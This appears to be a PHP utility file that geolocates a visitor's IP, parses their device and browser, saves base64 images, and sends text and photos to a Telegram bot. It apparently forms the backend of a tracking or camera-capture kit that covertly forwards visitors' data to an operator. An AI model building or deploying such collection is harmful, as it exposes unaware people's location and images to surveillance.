<?php

require_once __DIR__ . '/../config.php';

// === IP & Location ===
function getClientIP() {
    $ipKeys = [
        'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP', 'REMOTE_ADDR'
    ];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim($ipList[0]);
        }
    }
    return '0.0.0.0';
}

function lookupIP($ip) {
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,lat,lon,query";
    $json = @file_get_contents($url);
    return $json ? json_decode($json, true) : null;
}

function getLocation($ip) {
    $data = lookupIP($ip);
    if (!$data || $data['status'] !== 'success') return null;
    return "{$data['country']}, {$data['regionName']}, {$data['city']}";
}

// === Telegram ===
function sendTelegramMessage($text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_USER_ID) return;
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $payload = [
        'chat_id' => TELEGRAM_USER_ID,
        'text' => $text,
        'parse_mode' => 'HTML',
    ];
    file_get_contents($url . '?' . http_build_query($payload));
}

function sendTelegramPhoto($photoPath, $caption = '') {
    if (!file_exists($photoPath)) return;
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendPhoto";
    $post = [
        'chat_id' => TELEGRAM_USER_ID,
        'caption' => $caption,
        'photo' => new CURLFile(realpath($photoPath)),
    ];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS => $post,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegram($message, $photoPath = null) {
    if ($photoPath && file_exists($photoPath)) {
        sendTelegramPhoto($photoPath, $message);
    } else {
        sendTelegramMessage($message);
    }
}

// === Session ID ===
function generateSessionID() {
    return substr(bin2hex(random_bytes(16)), 0, 24);
}

// === Device & Browser Info ===
function parseDevice($ua) {
    $ua = strtolower($ua);
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false) return 'iOS';
    if (strpos($ua, 'android') !== false) return 'Android';
    if (strpos($ua, 'windows') !== false) return 'Windows';
    if (strpos($ua, 'macintosh') !== false) return 'Mac';
    if (strpos($ua, 'linux') !== false) return 'Linux';
    return 'Unknown';
}

function parseBrowser($ua) {
    $ua = strtolower($ua);
    if (strpos($ua, 'edg') !== false) return 'Edge';
    if (strpos($ua, 'chrome') !== false) return 'Chrome';
    if (strpos($ua, 'firefox') !== false) return 'Firefox';
    if (strpos($ua, 'safari') !== false && strpos($ua, 'chrome') === false) return 'Safari';
    return 'Unknown';
}

function parseUserAgent($ua) {
    return [parseDevice($ua), parseBrowser($ua)];
}

// === Image Handling ===
function saveBase64Image($base64, $prefix = 'photo') {
    $base64 = preg_replace('#^data:image/\w+;base64,#i', '', $base64);
    $data = base64_decode($base64);
    if (!$data) return false;

    $fileName = PHOTO_PATH . $prefix . '_' . time() . '_' . rand(1000, 9999) . '.jpg';
    file_put_contents($fileName, $data);
    return $fileName;
}

// === Sanitization ===
function sanitize($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}